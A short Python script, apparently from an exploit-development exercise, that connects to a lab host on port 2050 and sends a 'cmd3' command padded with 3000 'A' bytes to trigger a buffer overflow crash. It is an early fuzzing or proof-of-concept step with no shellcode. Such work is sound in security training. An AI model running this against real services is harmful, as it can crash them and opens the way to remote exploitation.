#!/usr/bin/python
# -*- coding: UTF-8 -*-
# Autor: 1º Ten Chitolina - 0x4rt3mis

import socket
import struct

IP = "192.168.122.49"
PORT = 2050

buffer = b"A" * 3000

# Imprime na tela o tamanho do buffer a ser enviado
print(b"Enviando payload no comando cmd3")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((IP, PORT))
r = s.recv(1024)
print(r)
s.send(b"cmd3 /.:/" + buffer + b"\r\n")
s.close()
